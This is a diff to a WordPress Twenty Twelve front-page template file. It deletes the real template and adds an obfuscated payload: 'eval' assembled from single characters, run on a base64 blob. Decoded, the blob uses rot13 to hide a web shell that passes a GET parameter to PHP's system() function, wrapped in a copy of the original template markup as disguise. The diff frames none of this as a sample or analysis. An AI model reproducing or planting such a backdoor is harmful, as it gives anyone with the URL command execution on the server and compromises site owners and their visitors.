@@ -1,48 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Template Name: Front Page Template
- *
- * Description: A page template that provides a key component of WordPress as a CMS
- * by meeting the need for a carefully crafted introductory page. The front page template
- * in Twenty Twelve consists of a page content area for adding text, images, video --
- * anything you'd like -- followed by front-page-only widgets in one or two columns.
- *
- * @package WordPress
- * @subpackage Twenty_Twelve
- * @since Twenty Twelve 1.0
- */
-
-get_header(); ?>
-
-	<div id="primary" class="site-content">
-		<div id="content" role="main">
-
-			<?php
-			while ( have_posts() ) :
-				the_post();
-				?>
-				<?php if ( has_post_thumbnail() ) : ?>
-					<div class="entry-page-image">
-						<?php the_post_thumbnail(); ?>
-					</div><!-- .entry-page-image -->
-				<?php endif; ?>
-
-				<?php get_template_part( 'content', 'page' ); ?>
-
-			<?php endwhile; // End of the loop. ?>
-
-		</div><!-- #content -->
-	</div><!-- #primary -->
-
-<?php get_sidebar( 'front' ); ?>
-<?php get_footer(); ?>
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3J6Y3luZ3IgQW56cjogU2ViYWcgQ250ciBHcnpjeW5ncgogKgogKiBRcmZwZXZjZ3ZiYTogTiBjbnRyIGdyemN5bmdyIGd1bmcgY2ViaXZxcmYgbiB4cmwgcGJ6Y2JhcmFnIGJzIEpiZXFDZXJmZiBuZiBuIFBaRgogKiBvbCB6cnJndmF0IGd1ciBhcnJxIHNiZSBuIHBuZXJzaHl5bCBwZW5zZ3JxIHZhZ2VicWhwZ2JlbCBjbnRyLiBHdXIgc2ViYWcgY250ciBncnpjeW5ncgogKiB2YSBHanJhZ2wgR2pyeWlyIHBiYWZ2ZmdmIGJzIG4gY250ciBwYmFncmFnIG5lcm4gc2JlIG5xcXZhdCBncmtnLCB2em50cmYsIGl2cXJiIC0tCiAqIG5hbGd1dmF0IGxiaCdxIHl2eHIgLS0gc2J5eWJqcnEgb2wgc2ViYWctY250ci1iYXlsIGp2cXRyZ2YgdmEgYmFyIGJlIGdqYiBwYnloemFmLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0dqcnlpcgogKiBAZnZhcHIgR2pyYWdsIEdqcnlpciAxLjAKICovCgp0cmdfdXJucXJlKCk7ID8+CgoJPHF2aSB2cT1cImNldnpuZWxcIiBweW5mZj1cImZ2Z3ItcGJhZ3JhZ1wiPgoJCTxxdmkgdnE9XCJwYmFncmFnXCIgZWJ5cj1cInpudmFcIj4KCgkJCTw/Y3VjCgkJCWp1dnlyICggdW5pcl9jYmZnZigpICkgOgoJCQkJZ3VyX2NiZmcoKTsKCQkJCT8+CgkJCQk8P2N1YyB2cyAoIHVuZl9jYmZnX2d1aHpvYW52eSgpICkgOiA/PgoJCQkJCTxxdmkgcHluZmY9XCJyYWdlbC1jbnRyLXZ6bnRyXCI+CgkJCQkJCTw/Y3VjIGd1cl9jYmZnX2d1aHpvYW52eSgpOyA/PgoJCQkJCTwvcXZpPjwhLS0gLnJhZ2VsLWNudHItdnpudHIgLS0+CgkJCQk8P2N1YyByYXF2czsgPz4KCgkJCQk8P2N1YyB0cmdfZ3J6Y3luZ3JfY25lZyggJ3BiYWdyYWcnLCAnY250cicgKTsgPz4KCgkJCTw/Y3VjIHJhcWp1dnlyOyAvLyBSYXEgYnMgZ3VyIHliYmMuID8+CgoJCTwvcXZpPjwhLS0gI3BiYWdyYWcgLS0+Cgk8L3F2aT48IS0tICNjZXZ6bmVsIC0tPgoKPD9jdWMgdHJnX2Z2cXJvbmUoICdzZWJhZycgKTsgPz4KPD9jdWMgdHJnX3NiYmdyZSgpOyA/PgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
